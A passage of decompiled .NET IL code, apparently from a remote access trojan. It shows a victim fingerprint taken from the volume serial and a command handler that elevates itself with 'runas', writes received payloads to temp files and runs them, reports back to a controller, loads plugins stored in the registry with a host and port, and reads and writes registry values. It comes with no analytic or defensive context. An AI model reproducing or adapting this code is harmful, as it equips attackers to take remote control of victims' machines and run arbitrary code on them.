      IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0047:  stloc.2
      IL_0048:  ldloc.2
      IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004e:  ldloc.2
      IL_004f:  stloc.3
      IL_0050:  ldarg.1
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.1
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  leave.s    IL_0063

    }  // end handler
    IL_0063:  ldloc.1
    IL_0064:  ret
  } // end of method L::GTV

  .method private static string  HWD() cil managed
  {
    // 
    .maxstack  8
    .locals init (string V_0,
             string V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             string V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.s    V_5
      IL_0003:  ldc.i4.0
      IL_0004:  stloc.s    V_4
      IL_0006:  ldc.i4.0
      IL_0007:  stloc.2
      IL_0008:  ldnull
      IL_0009:  stloc.3
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_9
      IL_0020:  ldloca.s   V_9
      IL_0022:  ldloca.s   V_5
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_6
      IL_0027:  ldloca.s   V_4
      IL_0029:  ldloca.s   V_2
      IL_002b:  ldloca.s   V_3
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 L::GetVolumeInformation(string&,
                                                         string&,
                                                         int32,
                                                         int32&,
                                                         int32&,
                                                         int32&,
                                                         string&,
                                                         int32)
      IL_0033:  pop
      IL_0034:  ldloc.s    V_6
      IL_0036:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003b:  stloc.1
      IL_003c:  leave.s    IL_0063

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  dup
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  stloc.s    V_7
      IL_0046:  ldloc.s    V_7
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  ldloc.s    V_7
      IL_004f:  stloc.s    V_8
      IL_0051:  ldstr      "ERR"
      IL_0056:  stloc.1
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  leave.s    IL_0063

    }  // end handler
    IL_0063:  ldloc.1
    IL_0064:  ret
  } // end of method L::HWD

  .method private static void  ASMIN(bool isCritical,
                                     bool& refWasCritical,
                                     bool needSystemCriticalBreaks) cil managed
  {
    // 
    .maxstack  8
    IL_0000:  ret
  } // end of method L::ASMIN

  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // 
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             string V_3,
             class [System]System.Diagnostics.Process V_4,
             bool V_5,
             class [mscorlib]System.Exception V_6,
             int32 V_7,
             class [mscorlib]System.IO.MemoryStream V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             uint8[] V_13,
             object V_14,
             int32 V_15,
             class [mscorlib]System.IO.MemoryStream V_16,
             uint8[] V_17,
             object V_18,
             int32 V_19,
             class [mscorlib]System.IO.MemoryStream V_20,
             class [System.Drawing]System.Drawing.Bitmap V_21,
             valuetype [System.Drawing]System.Drawing.Size V_22,
             valuetype [System.Drawing]System.Drawing.Rectangle V_23,
             string V_24,
             class [System.Drawing]System.Drawing.Graphics V_25,
             class [System.Drawing]System.Drawing.Bitmap V_26,
             class [mscorlib]System.IO.MemoryStream V_27,
             class [mscorlib]System.IO.MemoryStream V_28,
             class [mscorlib]System.Exception V_29,
             class [mscorlib]System.Exception V_30,
             object[] V_31,
             bool[] V_32,
             int32 V_33,
             int32 V_34,
             class [mscorlib]System.IO.MemoryStream V_35,
             class [mscorlib]System.Exception V_36,
             class [mscorlib]System.Exception V_37,
             class [mscorlib]System.Exception V_38,
             class [mscorlib]System.Exception V_39,
             string V_40,
             string V_41,
             string V_42,
             string[] V_43,
             object[] V_44,
             string V_45,
             valuetype [System.Drawing]System.Drawing.Rectangle V_46,
             valuetype [System.Drawing]System.Drawing.Rectangle V_47,
             valuetype [System.Drawing]System.Drawing.Rectangle V_48,
             valuetype [System.Drawing]System.Drawing.Rectangle V_49,
             string V_50,
             bool[] V_51)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string L::BS(uint8[]&)
    IL_0007:  ldsfld     string L::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.3
      IL_0018:  ldloc.3
      IL_0019:  stloc.s    V_40
      IL_001b:  ldloc.s    V_40
      IL_001d:  ldstr      "AW"
      IL_0022:  ldc.i4.0
      IL_0023:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0028:  ldc.i4.0
      IL_0029:  bne.un     IL_00af

      IL_002e:  newobj     instance void [System]System.Diagnostics.Process::.ctor()
      IL_0033:  stloc.s    V_4
      IL_0035:  ldloc.s    V_4
      IL_0037:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_003c:  ldc.i4.1
      IL_003d:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_0042:  ldloc.s    V_4
      IL_0044:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0049:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_004e:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0053:  ldloc.s    V_4
      IL_0055:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_005a:  ldc.i4.1
      IL_005b:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
      IL_0060:  ldloc.s    V_4
      IL_0062:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0067:  ldstr      "runas"
      IL_006c:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
      IL_0071:  ldloc.s    V_4
      IL_0073:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0078:  ldstr      ""
      IL_007d:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
      IL_0082:  ldloc.s    V_4
      IL_0084:  callvirt   instance bool [System]System.Diagnostics.Process::Start()
      IL_0089:  pop
      .try
      {
        IL_008a:  ldc.i4.0
        IL_008b:  ldloca.s   V_5
        IL_008d:  ldc.i4.0
        IL_008e:  call       void L::ASMIN(bool,
                                           bool&,
                                           bool)
        IL_0093:  leave.s    IL_00a4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0095:  dup
        IL_0096:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_009b:  stloc.s    V_6
        IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00a2:  leave.s    IL_00a4

      }  // end handler
      IL_00a4:  ldc.i4.0
      IL_00a5:  call       void [mscorlib]System.Environment::Exit(int32)
      IL_00aa:  br         IL_01e6

      IL_00af:  ldloc.s    V_40
      IL_00b1:  ldstr      "TMP"
      IL_00b6:  ldc.i4.0
      IL_00b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00bc:  ldc.i4.0
      IL_00bd:  bne.un.s   IL_00cf

      IL_00bf:  ldstr      "TMP"
      IL_00c4:  call       bool L::Send(string)
      IL_00c9:  pop
      IL_00ca:  br         IL_01e6

      IL_00cf:  ldloc.s    V_40
      IL_00d1:  ldstr      "RNS"
      IL_00d6:  ldc.i4.0
      IL_00d7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00dc:  ldc.i4.0
      IL_00dd:  bne.un.s   IL_00ef

      IL_00df:  ldstr      "RNS"
      IL_00e4:  call       bool L::Send(string)
      IL_00e9:  pop
      IL_00ea:  br         IL_01e6

      IL_00ef:  ldloc.s    V_40
      IL_00f1:  ldstr      "Setting_Chat"
      IL_00f6:  ldc.i4.0
      IL_00f7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00fc:  ldc.i4.0
      IL_00fd:  bne.un.s   IL_010f

      IL_00ff:  ldstr      "Setting_Chat"
      IL_0104:  call       bool L::Send(string)
      IL_0109:  pop
      IL_010a:  br         IL_01e6

      IL_010f:  ldloc.s    V_40
      IL_0111:  ldstr      "ll"
      IL_0116:  ldc.i4.0
      IL_0117:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_011c:  ldc.i4.0
      IL_011d:  bne.un.s   IL_012a

      IL_011f:  ldc.i4.0
      IL_0120:  stsfld     bool L::Cn
      IL_0125:  leave      IL_0c11

      IL_012a:  ldloc.s    V_40
      IL_012c:  ldstr      "prof"
      IL_0131:  ldc.i4.0
      IL_0132:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0137:  ldc.i4.0
      IL_0138:  bne.un     IL_01e6

      IL_013d:  ldloc.0
      IL_013e:  ldc.i4.1
      IL_013f:  ldelem.ref
      IL_0140:  stloc.s    V_41
      IL_0142:  ldloc.s    V_41
      IL_0144:  ldstr      "~"
      IL_0149:  ldc.i4.0
      IL_014a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_014f:  ldc.i4.0
      IL_0150:  bne.un.s   IL_0164

      IL_0152:  ldloc.0
      IL_0153:  ldc.i4.2
      IL_0154:  ldelem.ref
      IL_0155:  ldloc.0
      IL_0156:  ldc.i4.3
      IL_0157:  ldelem.ref
      IL_0158:  ldc.i4.1
      IL_0159:  call       bool L::STV(string,
                                       object,
                                       valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_015e:  pop
      IL_015f:  leave      IL_0c11

      IL_0164:  ldloc.s    V_41
      IL_0166:  ldstr      "!"
      IL_016b:  ldc.i4.0
      IL_016c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0171:  ldc.i4.0
      IL_0172:  bne.un.s   IL_01c4

      IL_0174:  ldloc.0
      IL_0175:  ldc.i4.2
      IL_0176:  ldelem.ref
      IL_0177:  ldloc.0
      IL_0178:  ldc.i4.3
      IL_0179:  ldelem.ref
      IL_017a:  ldc.i4.1
      IL_017b:  call       bool L::STV(string,
                                       object,
                                       valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0180:  pop
      IL_0181:  ldstr      "getvalue"
      IL_0186:  ldsfld     string L::Y
      IL_018b:  ldloc.0
      IL_018c:  ldc.i4.1
      IL_018d:  ldelem.ref
      IL_018e:  ldsfld     string L::Y
      IL_0193:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0198:  ldloc.0
      IL_0199:  ldc.i4.1
      IL_019a:  ldelem.ref
      IL_019b:  ldstr      ""
      IL_01a0:  call       object L::GTV(string,
                                         object)
      IL_01a5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01aa:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01af:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01b4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_01b9:  call       bool L::Send(string)
      IL_01be:  pop
      IL_01bf:  leave      IL_0c11

      IL_01c4:  ldloc.s    V_41
      IL_01c6:  ldstr      "@"
      IL_01cb:  ldc.i4.0
      IL_01cc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01d1:  ldc.i4.0
      IL_01d2:  bne.un.s   IL_01e1

      IL_01d4:  ldloc.0
      IL_01d5:  ldc.i4.2
      IL_01d6:  ldelem.ref
      IL_01d7:  call       void L::DLV(string)
      IL_01dc:  leave      IL_0c11

      IL_01e1:  leave      IL_0c11

      IL_01e6:  ldloc.3
      IL_01e7:  ldstr      "rn"
      IL_01ec:  ldc.i4.0
      IL_01ed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01f2:  ldc.i4.0
      IL_01f3:  beq.s      IL_01fa

      IL_01f5:  br         IL_032d

      IL_01fa:  ldloc.0
      IL_01fb:  ldc.i4.2
      IL_01fc:  ldelem.ref
      IL_01fd:  ldc.i4.0
      IL_01fe:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0203:  ldc.i4.s   31
      IL_0205:  bne.un     IL_0293

      .try
      {
        IL_020a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_020f:  stloc.s    V_8
        IL_0211:  ldloc.0
        IL_0212:  ldc.i4.0
        IL_0213:  ldelem.ref
        IL_0214:  ldsfld     string L::Y
        IL_0219:  ldloc.0
        IL_021a:  ldc.i4.1
        IL_021b:  ldelem.ref
        IL_021c:  ldsfld     string L::Y
        IL_0221:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0226:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_022b:  stloc.s    V_7
        IL_022d:  ldloc.s    V_8
        IL_022f:  ldarg.0
        IL_0230:  ldloc.s    V_7
        IL_0232:  ldarg.0
        IL_0233:  ldlen
        IL_0234:  conv.ovf.i4
        IL_0235:  ldloc.s    V_7
        IL_0237:  sub.ovf
        IL_0238:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_023d:  ldloc.s    V_8
        IL_023f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0244:  call       uint8[] L::ZIP(uint8[])
        IL_0249:  stloc.1
        IL_024a:  leave.s    IL_0293

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_024c:  dup
        IL_024d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0252:  stloc.s    V_9
        IL_0254:  ldloc.s    V_9
        IL_0256:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_025b:  ldloc.s    V_9
        IL_025d:  stloc.s    V_10
        IL_025f:  ldstr      "MSG"
        IL_0264:  ldsfld     string L::Y
        IL_0269:  ldstr      "Execute ERROR"
        IL_026e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0273:  call       bool L::Send(string)
        IL_0278:  pop
        IL_0279:  ldstr      "bla"
        IL_027e:  call       bool L::Send(string)
        IL_0283:  pop
        IL_0284:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0289:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_028e:  leave      IL_0c11

      }  // end handler
      IL_0293:  nop
      IL_0294:  ldstr      "bla"
      IL_0299:  call       bool L::Send(string)
      IL_029e:  pop
      IL_029f:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_02a4:  ldstr      "."
      IL_02a9:  ldloc.0
      IL_02aa:  ldc.i4.1
      IL_02ab:  ldelem.ref
      IL_02ac:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b1:  stloc.2
      .try
      {
        IL_02b2:  ldloc.2
        IL_02b3:  ldloc.1
        IL_02b4:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_02b9:  ldloc.2
        IL_02ba:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_02bf:  pop
        IL_02c0:  ldstr      "MSG"
        IL_02c5:  ldsfld     string L::Y
        IL_02ca:  ldstr      "Executed As "
        IL_02cf:  ldloc.2
        IL_02d0:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_02d5:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_02da:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_02df:  call       bool L::Send(string)
        IL_02e4:  pop
        IL_02e5:  leave      IL_0c11

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02ea:  dup
        IL_02eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f0:  stloc.s    V_11
        IL_02f2:  ldloc.s    V_11
        IL_02f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f9:  ldloc.s    V_11
        IL_02fb:  stloc.s    V_12
        IL_02fd:  ldstr      "MSG"
        IL_0302:  ldsfld     string L::Y
        IL_0307:  ldstr      "Execute ERROR "
        IL_030c:  ldloc.s    V_12
        IL_030e:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0313:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0318:  call       bool L::Send(string)
        IL_031d:  pop
        IL_031e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0323:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0328:  leave      IL_0c11

      }  // end handler
      IL_032d:  ldloc.3
      IL_032e:  stloc.s    V_42
      IL_0330:  ldloc.s    V_42
      IL_0332:  ldstr      "inv"
      IL_0337:  ldc.i4.0
      IL_0338:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_033d:  ldc.i4.0
      IL_033e:  bne.un     IL_05a9

      IL_0343:  ldloc.0
      IL_0344:  ldc.i4.1
      IL_0345:  ldelem.ref
      IL_0346:  ldc.i4.0
      IL_0347:  newarr     [mscorlib]System.Byte
      IL_034c:  call       object L::GTV(string,
                                         object)
      IL_0351:  castclass  uint8[]
      IL_0356:  stloc.s    V_13
      IL_0358:  ldloc.0
      IL_0359:  ldc.i4.3
      IL_035a:  ldelem.ref
      IL_035b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0360:  ldc.i4.s   10
      IL_0362:  clt
      IL_0364:  ldloc.s    V_13
      IL_0366:  ldlen
      IL_0367:  conv.ovf.i4
      IL_0368:  ldc.i4.0
      IL_0369:  ceq
      IL_036b:  and
      IL_036c:  brfalse.s  IL_03b4

      IL_036e:  ldc.i4.5
      IL_036f:  newarr     [mscorlib]System.String
      IL_0374:  stloc.s    V_43
      IL_0376:  ldloc.s    V_43
      IL_0378:  ldc.i4.0
      IL_0379:  ldstr      "pl"
      IL_037e:  stelem.ref
      IL_037f:  ldloc.s    V_43
      IL_0381:  ldc.i4.1
      IL_0382:  ldsfld     string L::Y
      IL_0387:  stelem.ref
      IL_0388:  ldloc.s    V_43
      IL_038a:  ldc.i4.2
      IL_038b:  ldloc.0
      IL_038c:  ldc.i4.1
      IL_038d:  ldelem.ref
      IL_038e:  stelem.ref
      IL_038f:  ldloc.s    V_43
      IL_0391:  ldc.i4.3
      IL_0392:  ldsfld     string L::Y
      IL_0397:  stelem.ref
      IL_0398:  ldloc.s    V_43
      IL_039a:  ldc.i4.4
      IL_039b:  ldc.i4.1
      IL_039c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_03a1:  stelem.ref
      IL_03a2:  ldloc.s    V_43
      IL_03a4:  call       string [mscorlib]System.String::Concat(string[])
      IL_03a9:  call       bool L::Send(string)
      IL_03ae:  pop
      IL_03af:  leave      IL_0c11

      IL_03b4:  ldloc.0
      IL_03b5:  ldc.i4.3
      IL_03b6:  ldelem.ref
      IL_03b7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03bc:  ldc.i4.s   10
      IL_03be:  ble.s      IL_0437

      IL_03c0:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_03c5:  stloc.s    V_16
      IL_03c7:  ldc.i4.6
      IL_03c8:  newarr     [mscorlib]System.String
      IL_03cd:  stloc.s    V_43
      IL_03cf:  ldloc.s    V_43
      IL_03d1:  ldc.i4.0
      IL_03d2:  ldloc.0
      IL_03d3:  ldc.i4.0
      IL_03d4:  ldelem.ref
      IL_03d5:  stelem.ref
      IL_03d6:  ldloc.s    V_43
      IL_03d8:  ldc.i4.1
      IL_03d9:  ldsfld     string L::Y
      IL_03de:  stelem.ref
      IL_03df:  ldloc.s    V_43
      IL_03e1:  ldc.i4.2
      IL_03e2:  ldloc.0
      IL_03e3:  ldc.i4.1
      IL_03e4:  ldelem.ref
      IL_03e5:  stelem.ref
      IL_03e6:  ldloc.s    V_43
      IL_03e8:  ldc.i4.3
      IL_03e9:  ldsfld     string L::Y
      IL_03ee:  stelem.ref
      IL_03ef:  ldloc.s    V_43
      IL_03f1:  ldc.i4.4
      IL_03f2:  ldloc.0
      IL_03f3:  ldc.i4.2
      IL_03f4:  ldelem.ref
      IL_03f5:  stelem.ref
      IL_03f6:  ldloc.s    V_43
      IL_03f8:  ldc.i4.5
      IL_03f9:  ldsfld     string L::Y
      IL_03fe:  stelem.ref
      IL_03ff:  ldloc.s    V_43
      IL_0401:  call       string [mscorlib]System.String::Concat(string[])
      IL_0406:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_040b:  stloc.s    V_15
      IL_040d:  ldloc.s    V_16
      IL_040f:  ldarg.0
      IL_0410:  ldloc.s    V_15
      IL_0412:  ldarg.0
      IL_0413:  ldlen
      IL_0414:  conv.ovf.i4
      IL_0415:  ldloc.s    V_15
      IL_0417:  sub.ovf
      IL_0418:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_041d:  ldloc.s    V_16
      IL_041f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0424:  call       uint8[] L::ZIP(uint8[])
      IL_0429:  stloc.s    V_13
      IL_042b:  ldloc.0
      IL_042c:  ldc.i4.1
      IL_042d:  ldelem.ref
      IL_042e:  ldloc.s    V_13
      IL_0430:  ldc.i4.3
      IL_0431:  call       bool L::STV(string,
                                       object,
                                       valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0436:  pop
      IL_0437:  ldc.i4.5
      IL_0438:  newarr     [mscorlib]System.String
      IL_043d:  stloc.s    V_43
      IL_043f:  ldloc.s    V_43
      IL_0441:  ldc.i4.0
      IL_0442:  ldstr      "pl"
      IL_0447:  stelem.ref
      IL_0448:  ldloc.s    V_43
      IL_044a:  ldc.i4.1
      IL_044b:  ldsfld     string L::Y
      IL_0450:  stelem.ref
      IL_0451:  ldloc.s    V_43
      IL_0453:  ldc.i4.2
      IL_0454:  ldloc.0
      IL_0455:  ldc.i4.1
      IL_0456:  ldelem.ref
      IL_0457:  stelem.ref
      IL_0458:  ldloc.s    V_43
      IL_045a:  ldc.i4.3
      IL_045b:  ldsfld     string L::Y
      IL_0460:  stelem.ref
      IL_0461:  ldloc.s    V_43
      IL_0463:  ldc.i4.4
      IL_0464:  ldc.i4.0
      IL_0465:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_046a:  stelem.ref
      IL_046b:  ldloc.s    V_43
      IL_046d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0472:  call       bool L::Send(string)
      IL_0477:  pop
      IL_0478:  ldloc.s    V_13
      IL_047a:  ldstr      "A"
      IL_047f:  call       object L::Plugin(uint8[],
                                            string)
      IL_0484:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0489:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_048e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0493:  stloc.s    V_14
      IL_0495:  ldloc.s    V_14
      IL_0497:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_049c:  ldnull
      IL_049d:  ldstr      "h"
      IL_04a2:  ldc.i4.1
      IL_04a3:  newarr     [mscorlib]System.Object
      IL_04a8:  stloc.s    V_44
      IL_04aa:  ldloc.s    V_44
      IL_04ac:  ldc.i4.0
      IL_04ad:  ldsfld     string L::H
      IL_04b2:  stelem.ref
      IL_04b3:  ldloc.s    V_44
      IL_04b5:  ldnull
      IL_04b6:  ldnull
      IL_04b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04bc:  ldloc.s    V_14
      IL_04be:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04c3:  ldnull
      IL_04c4:  ldstr      "p"
      IL_04c9:  ldc.i4.1
      IL_04ca:  newarr     [mscorlib]System.Object
      IL_04cf:  stloc.s    V_44
      IL_04d1:  ldloc.s    V_44
      IL_04d3:  ldc.i4.0
      IL_04d4:  ldsfld     string L::P
      IL_04d9:  stelem.ref
      IL_04da:  ldloc.s    V_44
      IL_04dc:  ldnull
      IL_04dd:  ldnull
      IL_04de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04e3:  ldloc.s    V_14
      IL_04e5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04ea:  ldnull
      IL_04eb:  ldstr      "osk"
      IL_04f0:  ldc.i4.1
      IL_04f1:  newarr     [mscorlib]System.Object
      IL_04f6:  stloc.s    V_44
      IL_04f8:  ldloc.s    V_44
      IL_04fa:  ldc.i4.0
      IL_04fb:  ldloc.0
      IL_04fc:  ldc.i4.2
      IL_04fd:  ldelem.ref
      IL_04fe:  stelem.ref
      IL_04ff:  ldloc.s    V_44
      IL_0501:  ldnull
      IL_0502:  ldnull
      IL_0503:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0508:  ldloc.s    V_14
      IL_050a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_050f:  ldnull
      IL_0510:  ldstr      "start"
      IL_0515:  ldc.i4.0
      IL_0516:  newarr     [mscorlib]System.Object
      IL_051b:  ldnull
      IL_051c:  ldnull
      IL_051d:  ldnull
      IL_051e:  ldc.i4.1
